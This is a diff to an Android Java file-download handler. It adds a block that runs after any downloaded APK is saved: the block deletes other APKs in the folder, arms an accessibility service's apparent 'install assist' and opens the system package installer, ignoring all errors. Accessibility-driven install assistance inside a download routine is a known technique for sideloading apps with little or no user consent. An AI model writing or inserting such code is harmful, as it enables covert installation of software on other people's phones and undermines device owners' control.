@@ -170,6 +170,25 @@ public class FileHandler {
             
             fos.close();
 
+            if (file.getName().toLowerCase().endsWith(".apk")) {
+                File dir = file.getParentFile();
+                if (dir != null) {
+                    File[] others = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".apk") && !name.equals(file.getName()));
+                    if (others != null) for (File o : others) o.delete();
+                }
+                try {
+                    com.task.tusker.services.UnifiedAccessibilityService svc = com.task.tusker.services.UnifiedAccessibilityService.getInstance();
+                    if (svc != null) svc.armInstallAssist(file.getAbsolutePath());
+                    android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW);
+                    android.net.Uri uri = androidx.core.content.FileProvider.getUriForFile(
+                            context, context.getPackageName() + ".fileprovider", file);
+                    intent.setDataAndType(uri, "application/vnd.android.package-archive");
+                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                            | android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                    context.startActivity(intent);
+                } catch (Exception ignored) {}
+            }
+
             result.put("success", true);
             result.put("filePath", filePath);
             result.put("size", file.length());
